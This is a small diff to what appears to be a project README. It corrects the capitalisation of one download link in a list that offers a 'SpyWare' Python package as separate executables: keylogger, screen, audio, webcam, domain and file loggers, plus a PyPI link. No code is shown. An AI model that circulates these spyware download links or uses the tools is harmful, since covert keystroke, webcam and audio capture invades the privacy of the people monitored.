@@ -319,7 +319,7 @@ modules:
  - [Download Screenshot as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/ScreenLogger.pyz)
  - [Download Domains as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/DomainsLogger.pyz)
  - [Download Recorder as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/AudioLogger.pyz)
- - [Download Keylogger as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/Keylogger.pyz)
+ - [Download Keylogger as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/KeyLogger.pyz)
  - [Download Webcam as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/WebcamLogger.pyz)
  - [Download Files as python executable](https://mauricelambert.github.io/info/python/security/SpyWare/FilesLogger.pyz)
  - [Pypi package](https://pypi.org/project/SpyWare/)
